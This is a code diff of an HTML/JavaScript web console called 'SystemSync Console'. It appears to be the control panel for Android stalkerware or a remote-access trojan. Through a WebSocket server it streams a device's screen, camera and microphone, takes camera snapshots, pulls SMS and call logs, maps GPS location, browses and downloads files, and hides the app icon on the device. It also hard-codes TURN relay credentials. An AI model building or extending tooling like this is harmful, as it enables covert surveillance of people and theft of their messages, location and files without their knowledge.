@@ -4,8 +4,384 @@
     <title>SystemSync Console</title>
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
     <style>
-        /* (Your existing CSS remains unchanged) */
-        body{margin:0;background:#f5f7fa;font-family:'Segoe UI',system-ui,sans-serif;display:flex;height:100vh;overflow:hidden;}#sidebar{width:280px;background:white;border-right:1px solid #e0e4e8;padding:20px;overflow-y:auto;box-shadow:2px 0 5px rgba(0,0,0,0.02);}.logo{font-size:20px;font-weight:600;color:#1976ff;margin-bottom:30px;}.section{margin-bottom:25px;}.section-title{font-size:12px;font-weight:600;color:#7b8a9b;text-transform:uppercase;letter-spacing:0.5px;margin-bottom:12px;}button{width:100%;padding:10px 12px;margin:4px 0;background:white;color:#1a2634;border:1px solid #d0d9e2;border-radius:8px;font-size:14px;text-align:left;cursor:pointer;transition:0.2s;display:flex;align-items:center;gap:8px;}button:hover{background:#1976ff;color:white;border-color:#1976ff;}.camera-panel{background:#f0f2f5;border-radius:8px;padding:12px;margin:8px 0;display:none;}.camera-panel.show{display:block;}.camera-option{margin:8px 0;}.camera-option label{margin-right:15px;color:#1a2634;}.capture-btn,.live-btn{background:#1976ff;color:white;border:none;padding:8px 12px;border-radius:6px;cursor:pointer;width:100%;margin-top:8px;}.capture-btn:hover,.live-btn:hover{background:#0d5bca;}.live-controls{display:flex;gap:8px;margin-top:10px;flex-wrap:wrap;}.live-controls button{flex:1;background:#1976ff;color:white;border:none;padding:8px 12px;border-radius:6px;cursor:pointer;width:auto;}.live-controls button.stop{background:#d32f2f;}.live-controls button.stop:hover{background:#b71c1c;}.live-controls button:disabled{opacity:0.5;cursor:not-allowed;}#main{flex:1;display:flex;flex-direction:column;min-width:0;background:#f5f7fa;}#header{height:60px;background:white;border-bottom:1px solid #e0e4e8;display:flex;align-items:center;justify-content:space-between;padding:0 25px;font-weight:600;color:#1a2634;}#status{padding:6px 16px;border-radius:30px;background:#e8f0fe;color:#1976ff;font-weight:500;cursor:pointer;}#status.offline{background:#ffebee;color:#c62828;}#content{flex:1;padding:20px;overflow:auto;}#main-panel{background:white;border-radius:12px;box-shadow:0 2px 8px rgba(0,0,0,0.05);padding:20px;min-height:100%;position:relative;}#map{height:400px;border-radius:10px;}.map-info{position:absolute;top:30px;left:30px;background:rgba(255,255,255,0.95);padding:8px 12px;border-radius:8px;box-shadow:0 2px 6px rgba(0,0,0,0.2);font-size:13px;color:#1a2634;z-index:1000;pointer-events:none;border-left:4px solid #1976ff;}.map-info div{margin:2px 0;}.map-info .coord{font-weight:600;}.map-info .addr{color:#2c3e50;font-style:italic;}table{width:100%;border-collapse:collapse;font-size:14px;}th{background:#f8fafd;color:#1a2634;font-weight:600;padding:12px 10px;text-align:left;border-bottom:2px solid #e0e4e8;}td{padding:10px;border-bottom:1px solid #eef2f5;color:#2c3e50;word-break:break-word;}tr:hover{background:#f5f9ff;}.file-manager{display:flex;flex-direction:column;height:100%;}.file-toolbar-sticky{position:sticky;top:0;background:white;z-index:10;padding-bottom:10px;margin-bottom:10px;border-bottom:1px solid #eef2f5;}.file-toolbar{display:flex;align-items:center;gap:8px;flex-wrap:wrap;}.file-toolbar button{width:auto;padding:6px 12px;background:white;border:1px solid #d0d9e2;border-radius:6px;cursor:pointer;font-size:13px;margin:0;}.file-toolbar button:hover{background:#1976ff;color:white;}.file-path{background:#f0f2f5;padding:6px 12px;border-radius:20px;font-size:13px;color:#2c3e50;flex:1;}.file-panes{display:flex;gap:20px;flex:1;overflow:hidden;min-height:300px;}.folder-pane{flex:1;background:#fafbfc;border-radius:8px;padding:10px;overflow-y:auto;border:1px solid #eef2f5;}.file-pane{flex:1;background:#fafbfc;border-radius:8px;padding:10px;overflow-y:auto;border:1px solid #eef2f5;}.pane-title{font-size:12px;font-weight:600;color:#7b8a9b;margin-bottom:10px;text-transform:uppercase;}.folder-item,.file-item{display:flex;align-items:center;padding:6px 8px;border-radius:6px;cursor:pointer;gap:8px;margin-bottom:2px;}.folder-item:hover{background:#e3f2fd;}.file-item{cursor:default;}.file-item:hover{background:#f5f5f5;}.folder-icon,.file-icon{width:20px;text-align:center;}.folder-name,.file-name{flex:1;font-size:14px;}.folder-name{color:#1976ff;}.file-checkbox{width:18px;height:18px;cursor:pointer;margin-right:8px;}.file-size{color:#7b8a9b;font-size:12px;margin-left:10px;}.download-selected{margin-top:15px;text-align:right;position:sticky;bottom:0;background:white;padding:10px 0 0 0;border-top:1px solid #eef2f5;}.download-selected button{width:auto;padding:8px 16px;background:#1976ff;color:white;border:none;border-radius:6px;cursor:pointer;font-weight:500;}.download-selected button:hover{background:#0d5bca;}.pagination{margin-top:20px;display:flex;gap:8px;justify-content:center;}.page-btn{padding:6px 12px;border:1px solid #d0d9e2;background:white;border-radius:6px;cursor:pointer;color:#1a2634;}.page-btn:hover{background:#1976ff;color:white;border-color:#1976ff;}img,video{max-width:100%;max-height:70vh;border-radius:8px;display:block;margin:0 auto;}audio{width:100%;margin-top:15px;}.reconnect-btn{background:#1976ff;color:white;border:none;border-radius:20px;padding:5px 15px;font-size:12px;cursor:pointer;margin-left:10px;}
+        /* (keep your existing CSS – unchanged) */
+        body{
+            margin:0;
+            background:#f5f7fa;
+            font-family: 'Segoe UI', system-ui, sans-serif;
+            display:flex;
+            height:100vh;
+            overflow:hidden;
+        }
+        #sidebar{
+            width:280px;
+            background:white;
+            border-right:1px solid #e0e4e8;
+            padding:20px;
+            overflow-y:auto;
+            box-shadow:2px 0 5px rgba(0,0,0,0.02);
+        }
+        .logo{
+            font-size:20px;
+            font-weight:600;
+            color:#1976ff;
+            margin-bottom:30px;
+        }
+        .section{
+            margin-bottom:25px;
+        }
+        .section-title{
+            font-size:12px;
+            font-weight:600;
+            color:#7b8a9b;
+            text-transform:uppercase;
+            letter-spacing:0.5px;
+            margin-bottom:12px;
+        }
+        button{
+            width:100%;
+            padding:10px 12px;
+            margin:4px 0;
+            background:white;
+            color:#1a2634;
+            border:1px solid #d0d9e2;
+            border-radius:8px;
+            font-size:14px;
+            text-align:left;
+            cursor:pointer;
+            transition:0.2s;
+            display:flex;
+            align-items:center;
+            gap:8px;
+        }
+        button:hover{
+            background:#1976ff;
+            color:white;
+            border-color:#1976ff;
+        }
+        .camera-panel {
+            background: #f0f2f5;
+            border-radius: 8px;
+            padding: 12px;
+            margin: 8px 0;
+            display: none;
+        }
+        .camera-panel.show {
+            display: block;
+        }
+        .camera-option {
+            margin: 8px 0;
+        }
+        .camera-option label {
+            margin-right: 15px;
+            color: #1a2634;
+        }
+        .capture-btn, .live-btn {
+            background: #1976ff;
+            color: white;
+            border: none;
+            padding: 8px 12px;
+            border-radius: 6px;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 8px;
+        }
+        .capture-btn:hover, .live-btn:hover {
+            background: #0d5bca;
+        }
+        .live-controls {
+            display: flex;
+            gap: 8px;
+            margin-top: 10px;
+            flex-wrap: wrap;
+        }
+        .live-controls button {
+            flex: 1;
+            background: #1976ff;
+            color: white;
+            border: none;
+            padding: 8px 12px;
+            border-radius: 6px;
+            cursor: pointer;
+            width: auto;
+        }
+        .live-controls button.stop {
+            background: #d32f2f;
+        }
+        .live-controls button.stop:hover {
+            background: #b71c1c;
+        }
+        .live-controls button:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+        #main{
+            flex:1;
+            display:flex;
+            flex-direction:column;
+            min-width:0;
+            background:#f5f7fa;
+        }
+        #header{
+            height:60px;
+            background:white;
+            border-bottom:1px solid #e0e4e8;
+            display:flex;
+            align-items:center;
+            justify-content:space-between;
+            padding:0 25px;
+            font-weight:600;
+            color:#1a2634;
+        }
+        #status{
+            padding:6px 16px;
+            border-radius:30px;
+            background:#e8f0fe;
+            color:#1976ff;
+            font-weight:500;
+            cursor: pointer;
+        }
+        #status.offline{
+            background:#ffebee;
+            color:#c62828;
+        }
+        #content{
+            flex:1;
+            padding:20px;
+            overflow:auto;
+        }
+        #main-panel{
+            background:white;
+            border-radius:12px;
+            box-shadow:0 2px 8px rgba(0,0,0,0.05);
+            padding:20px;
+            min-height:100%;
+            position:relative;
+        }
+        #map{
+            height:400px;
+            border-radius:10px;
+        }
+        .map-info {
+            position: absolute;
+            top: 30px;
+            left: 30px;
+            background: rgba(255,255,255,0.95);
+            padding: 8px 12px;
+            border-radius: 8px;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+            font-size: 13px;
+            color: #1a2634;
+            z-index: 1000;
+            pointer-events: none;
+            border-left: 4px solid #1976ff;
+        }
+        .map-info div {
+            margin: 2px 0;
+        }
+        .map-info .coord {
+            font-weight: 600;
+        }
+        .map-info .addr {
+            color: #2c3e50;
+            font-style: italic;
+        }
+        table{
+            width:100%;
+            border-collapse:collapse;
+            font-size:14px;
+        }
+        th{
+            background:#f8fafd;
+            color:#1a2634;
+            font-weight:600;
+            padding:12px 10px;
+            text-align:left;
+            border-bottom:2px solid #e0e4e8;
+        }
+        td{
+            padding:10px;
+            border-bottom:1px solid #eef2f5;
+            color:#2c3e50;
+            word-break:break-word;
+        }
+        tr:hover{
+            background:#f5f9ff;
+        }
+        .file-manager {
+            display: flex;
+            flex-direction: column;
+            height: 100%;
+        }
+        .file-toolbar-sticky {
+            position: sticky;
+            top: 0;
+            background: white;
+            z-index: 10;
+            padding-bottom: 10px;
+            margin-bottom: 10px;
+            border-bottom: 1px solid #eef2f5;
+        }
+        .file-toolbar {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            flex-wrap: wrap;
+        }
+        .file-toolbar button{
+            width:auto;
+            padding:6px 12px;
+            background:white;
+            border:1px solid #d0d9e2;
+            border-radius:6px;
+            cursor:pointer;
+            font-size:13px;
+            margin:0;
+        }
+        .file-toolbar button:hover{
+            background:#1976ff;
+            color:white;
+        }
+        .file-path{
+            background:#f0f2f5;
+            padding:6px 12px;
+            border-radius:20px;
+            font-size:13px;
+            color:#2c3e50;
+            flex:1;
+        }
+        .file-panes {
+            display: flex;
+            gap: 20px;
+            flex: 1;
+            overflow: hidden;
+            min-height: 300px;
+        }
+        .folder-pane {
+            flex: 1;
+            background: #fafbfc;
+            border-radius: 8px;
+            padding: 10px;
+            overflow-y: auto;
+            border: 1px solid #eef2f5;
+        }
+        .file-pane {
+            flex: 1;
+            background: #fafbfc;
+            border-radius: 8px;
+            padding: 10px;
+            overflow-y: auto;
+            border: 1px solid #eef2f5;
+        }
+        .pane-title {
+            font-size: 12px;
+            font-weight: 600;
+            color: #7b8a9b;
+            margin-bottom: 10px;
+            text-transform: uppercase;
+        }
+        .folder-item, .file-item {
+            display: flex;
+            align-items: center;
+            padding: 6px 8px;
+            border-radius: 6px;
+            cursor: pointer;
+            gap: 8px;
+            margin-bottom: 2px;
+        }
+        .folder-item:hover {
+            background: #e3f2fd;
+        }
+        .file-item {
+            cursor: default;
+        }
+        .file-item:hover {
+            background: #f5f5f5;
+        }
+        .folder-icon, .file-icon {
+            width: 20px;
+            text-align: center;
+        }
+        .folder-name, .file-name {
+            flex: 1;
+            font-size: 14px;
+        }
+        .folder-name {
+            color: #1976ff;
+        }
+        .file-checkbox {
+            width: 18px;
+            height: 18px;
+            cursor: pointer;
+            margin-right: 8px;
+        }
+        .file-size {
+            color: #7b8a9b;
+            font-size: 12px;
+            margin-left: 10px;
+        }
+        .download-selected{
+            margin-top:15px;
+            text-align:right;
+            position: sticky;
+            bottom: 0;
+            background: white;
+            padding: 10px 0 0 0;
+            border-top: 1px solid #eef2f5;
+        }
+        .download-selected button{
+            width:auto;
+            padding:8px 16px;
+            background:#1976ff;
+            color:white;
+            border:none;
+            border-radius:6px;
+            cursor:pointer;
+            font-weight:500;
+        }
+        .download-selected button:hover{
+            background:#0d5bca;
+        }
+        .pagination{
+            margin-top:20px;
+            display:flex;
+            gap:8px;
+            justify-content:center;
+        }
+        .page-btn{
+            padding:6px 12px;
+            border:1px solid #d0d9e2;
+            background:white;
+            border-radius:6px;
+            cursor:pointer;
+            color:#1a2634;
+        }
+        .page-btn:hover{
+            background:#1976ff;
+            color:white;
+            border-color:#1976ff;
+        }
+        img, video{
+            max-width:100%;
+            max-height:70vh;
+            border-radius:8px;
+            display:block;
+            margin:0 auto;
+        }
+        audio{
+            width:100%;
+            margin-top:15px;
+        }
+        .reconnect-btn{
+            background: #1976ff;
+            color: white;
+            border: none;
+            border-radius: 20px;
+            padding: 5px 15px;
+            font-size: 12px;
+            cursor: pointer;
+            margin-left: 10px;
+        }
     </style>
 </head>
 <body>
@@ -16,6 +392,8 @@
     <div class="section">
         <div class="section-title">Surveillance</div>
         <button id="screenShareBtn"><span>🖥</span> <span id="screenBtn">Start Screen</span></button>
+
+        <!-- Click Picture panel -->
         <button onclick="toggleCameraPanel('click')"><span>📷</span> Click Picture</button>
         <div id="clickCameraPanel" class="camera-panel">
             <div class="camera-option">
@@ -28,6 +406,7 @@
             <button class="capture-btn" onclick="capturePicture()">TAKE A PICTURE</button>
         </div>
 
+        <!-- See Live panel -->
         <button onclick="toggleCameraPanel('live')"><span>📹</span> See Live</button>
         <div id="liveCameraPanel" class="camera-panel">
             <div class="camera-option">
@@ -41,6 +420,7 @@
             <button class="live-btn" onclick="startLiveStream()">See Live</button>
         </div>
 
+        <!-- Live Audio button -->
         <button onclick="toggleLiveAudio()"><span>🎤</span> <span id="liveAudioBtn">Live Audio</span></button>
         <button onclick="stopLiveAudio()" style="display:none;" id="stopLiveAudioBtn">⏹ Stop Live Audio</button>
 
@@ -76,6 +456,8 @@
     </div>
 </div>
 
+<!-- Leaflet -->
+<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 <script type="module">
     // ---------- GLOBALS ----------
     const WS_URL = "wss://mirror-view.onrender.com";
@@ -100,6 +482,9 @@
     let mediaRecorder = null;
     let recordedChunks = [];
 
+    // Track the last command sent to interpret raw responses
+    let pendingCommand = null;
+
     const panel = document.getElementById('main-panel');
     const statusEl = document.getElementById('status');
 
@@ -111,26 +496,6 @@
         { urls: "turn:standard.relay.metered.ca:443", username: "dc05b4f4ae8aaae1fff19747", credential: "OrIiLL1BH86B17iP" },
         { urls: "turns:standard.relay.metered.ca:443?transport=tcp", username: "dc05b4f4ae8aaae1fff19747", credential: "OrIiLL1BH86B17iP" }
     ];
-
-    // ---------- PEER CONNECTION CREATORS ----------
-    function createPeerConnection(streamType, onTrack) {
-        const pc = new RTCPeerConnection({ iceServers: ICE_SERVERS });
-        pc.ontrack = onTrack;
-        pc.onicecandidate = (e) => {
-            if (e.candidate) {
-                // Send ICE candidate via WebSocket
-                sendSignalingMessage({
-                    type: 'ICE_CANDIDATE',
-                    candidate: e.candidate,
-                    streamType: streamType
-                });
-            }
-        };
-        pc.oniceconnectionstatechange = () => {
-            console.log(`${streamType} PC ICE state:`, pc.iceConnectionState);
-        };
-        return pc;
-    }
 
     // ---------- SIGNALING OVER WEBSOCKET ----------
     function sendSignalingMessage(msg) {
@@ -146,6 +511,56 @@
         console.log('📤 Signaling sent:', msg.type);
     }
 
+    // ---------- PEER CONNECTION CREATORS ----------
+    function createPeerConnection(streamType, onTrackCallback) {
+        const pc = new RTCPeerConnection({ iceServers: ICE_SERVERS });
+        pc.ontrack = onTrackCallback;
+        pc.onicecandidate = (e) => {
+            if (e.candidate) {
+                sendSignalingMessage({
+                    type: 'ICE_CANDIDATE',
+                    candidate: e.candidate,
+                    streamType: streamType
+                });
+            }
+        };
+        pc.oniceconnectionstatechange = () => {
+            console.log(`${streamType} PC ICE state:`, pc.iceConnectionState);
+            if (pc.iceConnectionState === 'disconnected' || pc.iceConnectionState === 'failed') {
+                if (streamType === 'screen') {
+                    screenActive = false;
+                    document.getElementById('screenBtn').innerText = 'Start Screen';
+                }
+            }
+        };
+        return pc;
+    }
+
+    // Helper to get the correct peer connection based on stream type
+    function getPCForType(type) {
+        if (type === 'screen') return screenPC;
+        if (type === 'camera') return cameraPC;
+        if (type === 'audio') return audioPC;
+        return null;
+    }
+
+    // ---------- HANDLE INCOMING SIGNALING MESSAGES ----------
+    function handleSignalingMessage(msg) {
+        console.log('Received signaling:', msg);
+        if (msg.type === 'ANSWER') {
+            const pc = getPCForType(msg.streamType);
+            if (pc) {
+                const answer = new RTCSessionDescription({ type: 'answer', sdp: msg.sdp });
+                pc.setRemoteDescription(answer).catch(e => console.error('Error setting remote description:', e));
+            }
+        } else if (msg.type === 'ICE_CANDIDATE') {
+            const pc = getPCForType(msg.streamType);
+            if (pc && msg.candidate) {
+                pc.addIceCandidate(new RTCIceCandidate(msg.candidate)).catch(e => console.error('Error adding ICE candidate:', e));
+            }
+        }
+    }
+
     // ---------- SCREEN SHARE ----------
     async function toggleScreen() {
         console.log('toggleScreen called, current screenActive:', screenActive);
@@ -158,7 +573,6 @@
             document.getElementById('screenBtn').innerText = 'Start Screen';
             screenActive = false;
             panel.innerHTML = 'Ready.';
-            // Notify device to stop (optional)
             sendSignalingMessage({ type: 'STOP_SCREEN' });
         } else {
             panel.innerHTML = '<h2>Starting screen share...</h2>';
@@ -175,7 +589,6 @@
             try {
                 const offer = await screenPC.createOffer();
                 await screenPC.setLocalDescription(offer);
-                // Send offer to device
                 sendSignalingMessage({
                     type: 'OFFER',
                     sdp: offer.sdp,
@@ -190,6 +603,27 @@
                 panel.innerHTML = 'Ready.';
             }
         }
+    }
+
+    // ---------- SNAP SCREEN ----------
+    function snapScreen() {
+        const video = document.querySelector('video');
+        if (!video || !video.videoWidth) {
+            alert('No active screen share or video not ready');
+            return;
+        }
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        canvas.toBlob(blob => {
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `screen_${Date.now()}.png`;
+            a.click();
+            URL.revokeObjectURL(url);
+        }, 'image/png');
     }
 
     // ---------- LIVE CAMERA ----------
@@ -288,51 +722,6 @@
         panel.innerHTML = 'Ready.';
     }
 
-    // ---------- SNAP SCREEN ----------
-    function snapScreen() {
-        const video = document.querySelector('video');
-        if (!video || !video.videoWidth) {
-            alert('No active screen share or video not ready');
-            return;
-        }
-        const canvas = document.createElement('canvas');
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        canvas.getContext('2d').drawImage(video, 0, 0);
-        canvas.toBlob(blob => {
-            const url = URL.createObjectURL(blob);
-            const a = document.createElement('a');
-            a.href = url;
-            a.download = `screen_${Date.now()}.png`;
-            a.click();
-            URL.revokeObjectURL(url);
-        }, 'image/png');
-    }
-
-    // ---------- HANDLE INCOMING SIGNALING MESSAGES ----------
-    function handleSignalingMessage(msg) {
-        console.log('Received signaling:', msg);
-        if (msg.type === 'ANSWER') {
-            const pc = getPCForType(msg.streamType);
-            if (pc) {
-                const answer = new RTCSessionDescription({ type: 'answer', sdp: msg.sdp });
-                pc.setRemoteDescription(answer);
-            }
-        } else if (msg.type === 'ICE_CANDIDATE') {
-            const pc = getPCForType(msg.streamType);
-            if (pc) {
-                pc.addIceCandidate(new RTCIceCandidate(msg.candidate));
-            }
-        }
-    }
-
-    function getPCForType(type) {
-        if (type === 'screen') return screenPC;
-        if (type === 'camera') return cameraPC;
-        if (type === 'audio') return audioPC;
-        return null;
-    }
-
     // ---------- COMMAND SENDING (JSON) ----------
     function sendCommand(command, params = {}) {
         if (!ws || ws.readyState !== WebSocket.OPEN) {
@@ -349,9 +738,11 @@
         };
         ws.send(JSON.stringify(payload));
         panel.innerHTML = `📤 Command sent: ${command}`;
+        pendingCommand = command;
+        setTimeout(() => { if (pendingCommand === command) pendingCommand = null; }, 10000);
     }
 
-    // ---------- PLAIN TEXT SENDING ----------
+    // ---------- PLAIN TEXT SENDING (for hideApp/showApp and file downloads) ----------
     function sendPlainText(msg) {
         if (!ws || ws.readyState !== WebSocket.OPEN) {
             panel.innerHTML = `<div style="color:#d32f2f;">⚠ WebSocket not connected. Click reconnect.</div>`;
@@ -361,27 +752,8 @@
         panel.innerHTML = `📤 Plain text sent: ${msg}`;
     }
 
-    // ---------- WEBSOCKET MESSAGE HANDLER ----------
-    function handleIncomingMessage(msg) {
-        try {
-            const json = JSON.parse(msg);
-            if (json.type === 'SIGNALING') {
-                handleSignalingMessage(json.data);
-            } else if (json.type === 'COMMAND_RESPONSE') {
-                // Handle command responses (existing)
-                handleJSON(json);
-            } else {
-                // Fallback to existing plain text handlers
-                handlePlainText(msg);
-            }
-        } catch (e) {
-            // Plain text
-            handlePlainText(msg);
-        }
-    }
-
-    // ---------- EXISTING HANDLERS (unchanged) ----------
-   function handleJSON(json) {
+    // ---------- PLAIN TEXT / JSON HANDLERS ----------
+    function handleJSON(json) {
         console.log('handleJSON:', json.type, json);
         switch (json.type) {
             case 'SMS_DATA':
@@ -448,14 +820,8 @@
                 showNotification('Screen share stopped');
                 pendingCommand = null;
                 break;
-            case 'ROOM_CREATED':
-                // Android created a room, join it
-                if (json.roomId) joinFirebaseRoom(json.roomId);
-                pendingCommand = null;
-                break;
             default:
                 console.log('Unhandled JSON type:', json.type);
-                // If we have a pending command, try to infer the response format
                 if (pendingCommand === 'LIST_FILES' && Array.isArray(json)) {
                     dataType = 'file';
                     currentData = json;
@@ -549,7 +915,6 @@
             downloadBase64(base64, 'downloaded_file');
             pendingCommand = null;
         } else if (msg.startsWith('[') || msg.startsWith('{')) {
-            // Try to parse as JSON (raw response from device)
             try {
                 const parsed = JSON.parse(msg);
                 handleJSON(parsed);
@@ -561,10 +926,348 @@
         }
     }
 
+    function setStatus(s) {
+        statusEl.innerText = s;
+        if (s === 'ONLINE') {
+            statusEl.classList.remove('offline');
+            statusEl.style.background = '#e8f5e9';
+            statusEl.style.color = '#2e7d32';
+        } else {
+            statusEl.classList.add('offline');
+            statusEl.style.background = '#ffebee';
+            statusEl.style.color = '#c62828';
+        }
+    }
+
+    // ---------- CAMERA UI ----------
+    function toggleCameraPanel(panelId) {
+        const clickPanel = document.getElementById('clickCameraPanel');
+        const livePanel = document.getElementById('liveCameraPanel');
+        if (panelId === 'click') {
+            clickPanel.classList.toggle('show');
+            livePanel.classList.remove('show');
+        } else {
+            livePanel.classList.toggle('show');
+            clickPanel.classList.remove('show');
+        }
+    }
+
+    function capturePicture() {
+        const camera = document.querySelector('input[name="clickCameraSelect"]:checked').value;
+        const useFlash = document.getElementById('clickFlashCheckbox').checked;
+        sendCommand('CAMERA_SNAPSHOT', { camera, flash: useFlash });
+    }
+
+    function displayCapturedImage(base64) {
+        panel.innerHTML = `
+            <img src="data:image/jpeg;base64,${base64}">
+            <div style="margin-top:10px;">
+                <button onclick="downloadBase64('${base64}', 'snapshot_${Date.now()}.jpeg')">SAVE IMAGE</button>
+            </div>
+        `;
+    }
+
+    // ---------- LIVE STREAM ACTIONS (snapshot/record) ----------
+    function takeSnapshot() {
+        const video = document.getElementById('liveCamVideo');
+        if (!video || !video.videoWidth) {
+            alert('No live video or video not ready');
+            return;
+        }
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        canvas.toBlob(blob => {
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `snapshot_${Date.now()}.png`;
+            a.click();
+            URL.revokeObjectURL(url);
+        }, 'image/png');
+    }
+
+    function toggleRecording() {
+        const video = document.getElementById('liveCamVideo');
+        if (!video || !video.srcObject) {
+            alert('No live stream');
+            return;
+        }
+        if (mediaRecorder && mediaRecorder.state === 'recording') {
+            mediaRecorder.stop();
+            document.getElementById('recordBtn').innerText = 'Record Video';
+        } else {
+            recordedChunks = [];
+            const stream = video.srcObject;
+            mediaRecorder = new MediaRecorder(stream);
+            mediaRecorder.ondataavailable = (e) => recordedChunks.push(e.data);
+            mediaRecorder.onstop = () => {
+                const blob = new Blob(recordedChunks, { type: 'video/webm' });
+                const url = URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = `recording_${Date.now()}.webm`;
+                a.click();
+                URL.revokeObjectURL(url);
+            };
+            mediaRecorder.start();
+            document.getElementById('recordBtn').innerText = 'Stop Recording';
+        }
+    }
+
+    // ---------- APP ICON TOGGLE ----------
+    function toggleAppIcon() {
+        if (iconHidden) sendPlainText('showApp');
+        else sendPlainText('hideApp');
+    }
+
+    // ---------- RENDERERS ----------
+    function showAudio(base64) {
+        panel.innerHTML = `
+            <audio controls src="data:audio/3gp;base64,${base64}"></audio>
+            <button onclick="downloadBase64('${base64}', 'recording.3gp')">Download</button>
+        `;
+    }
+
+    function downloadBase64(b64, filename) {
+        const a = document.createElement('a');
+        a.href = 'data:application/octet-stream;base64,' + b64;
+        a.download = filename;
+        a.click();
+    }
+
+    function renderMap(loc) {
+        panel.innerHTML = '<div id="map" style="position:relative;"></div>';
+        const mapDiv = document.getElementById('map');
+
+        const infoDiv = document.createElement('div');
+        infoDiv.className = 'map-info';
+        infoDiv.innerHTML = `
+            <div class="coord">📍 ${loc.lat.toFixed(6)}, ${loc.lon.toFixed(6)}</div>
+            <div>🎯 Accuracy: ${loc.accuracy ? loc.accuracy.toFixed(1) : '?'} m</div>
+            <div>📡 Provider: ${loc.provider || 'unknown'}</div>
+            <div class="addr">🌍 Loading address...</div>
+        `;
+        mapDiv.appendChild(infoDiv);
+
+        if (mapInstance) mapInstance.remove();
+        mapInstance = L.map(mapDiv).setView([loc.lat, loc.lon], 18);
+        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(mapInstance);
+        L.circle([loc.lat, loc.lon], { radius: loc.accuracy || 10, color: '#1976ff' }).addTo(mapInstance);
+
+        fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${loc.lat}&lon=${loc.lon}&zoom=18&addressdetails=1`, {
+            headers: { 'User-Agent': 'SystemSync-Console/1.0' }
+        })
+        .then(response => response.json())
+        .then(data => {
+            const address = data.display_name || 'Address not found';
+            infoDiv.querySelector('.addr').innerHTML = `🌍 ${address}`;
+        })
+        .catch(err => {
+            console.error('Geocoding error:', err);
+            infoDiv.querySelector('.addr').innerHTML = '🌍 Address unavailable';
+        });
+    }
+
+    function renderTable() {
+        if (!currentData || currentData.length === 0) {
+            panel.innerHTML = '<p>No data</p>';
+            return;
+        }
+
+        let headers = [], rows = [];
+        if (dataType === 'sms') {
+            headers = ['Type', 'Number', 'Message', 'Date'];
+            rows = currentData.map(item => [item.type, item.number, item.body, item.date]);
+        } else if (dataType === 'call') {
+            headers = ['Type', 'Number', 'Name', 'Date', 'Duration'];
+            rows = currentData.map(item => [
+                item.type,
+                item.number,
+                item.name || '',
+                item.date,
+                item.duration + 's'
+            ]);
+        } else {
+            panel.innerHTML = '<p>Unknown data type</p>';
+            return;
+        }
+
+        const pageSize = 20;
+        const totalPages = Math.ceil(rows.length / pageSize);
+        const start = currentPage * pageSize;
+        const pageRows = rows.slice(start, start + pageSize);
+
+        let html = '<table><thead><tr>';
+        headers.forEach(h => html += `<th>${h}</th>`);
+        html += '</tr></thead><tbody>';
+
+        pageRows.forEach(r => {
+            html += '<tr>';
+            r.forEach(cell => html += `<td>${cell}</td>`);
+            html += '</tr>';
+        });
+        html += '</tbody></table>';
+
+        if (totalPages > 1) {
+            html += '<div class="pagination">';
+            for (let i = 0; i < totalPages; i++) {
+                html += `<button class="page-btn" onclick="gotoPage(${i})">${i+1}</button>`;
+            }
+            html += '</div>';
+        }
+
+        panel.innerHTML = html;
+    }
+
+    function gotoPage(p) {
+        currentPage = p;
+        renderTable();
+    }
+
+    function renderFiles() {
+        let html = `
+            <div class="file-manager">
+                <div class="file-toolbar-sticky">
+                    <div class="file-toolbar">
+                        <button onclick="navigateUp()">⬆ Up</button>
+                        <span class="file-path">${currentPath}</span>
+                        <div class="download-selected">
+                            <button onclick="downloadSelected()">Download Selected (${selectedFiles.length})</button>
+                        </div>
+                    </div>
+                </div>
+        `;
+
+        if (!currentData || currentData.length === 0) {
+            html += '<p style="padding:20px;">No files found.</p>';
+        } else {
+            const folders = currentData.filter(item => item.isDir);
+            const files = currentData.filter(item => !item.isDir);
+            selectedFiles = [];
+
+            html += `
+                <div class="file-panes">
+                    <div class="folder-pane">
+                        <div class="pane-title">Folders</div>
+                        <div id="folderList">
+            `;
+
+            folders.forEach(f => {
+                html += `
+                    <div class="folder-item" onclick="handleFolderClick('${f.path}')">
+                        <span class="folder-icon">📁</span>
+                        <span class="folder-name">${f.name}</span>
+                    </div>
+                `;
+            });
+
+            html += `
+                        </div>
+                    </div>
+                    <div class="file-pane">
+                        <div class="pane-title">Files</div>
+                        <div id="fileList">
+            `;
+
+            files.forEach(f => {
+                const path = f.path;
+                const name = f.name;
+                const size = formatBytes(f.size);
+                html += `
+                    <div class="file-item">
+                        <input type="checkbox" class="file-checkbox" data-path="${path}" onchange="updateSelected(this)">
+                        <span class="file-icon">📄</span>
+                        <span class="file-name">${name}</span>
+                        <span class="file-size">${size}</span>
+                    </div>
+                `;
+            });
+
+            html += `
+                        </div>
+                    </div>
+                </div>
+            `;
+        }
+
+        html += '</div>';
+        panel.innerHTML = html;
+    }
+
+    function handleFolderClick(path) {
+        currentPath = path;
+        sendCommand('LIST_FILES', { path: path });
+    }
+
+    function navigateUp() {
+        if (currentPath === 'root' || currentPath === '') return;
+        let parts = currentPath.split('/');
+        parts.pop();
+        let parent = parts.join('/');
+        if (parent === '') parent = 'root';
+        currentPath = parent;
+        sendCommand('LIST_FILES', { path: parent });
+    }
+
+    function updateSelected(checkbox) {
+        const path = checkbox.dataset.path;
+        if (checkbox.checked) {
+            if (!selectedFiles.includes(path)) selectedFiles.push(path);
+        } else {
+            selectedFiles = selectedFiles.filter(p => p !== path);
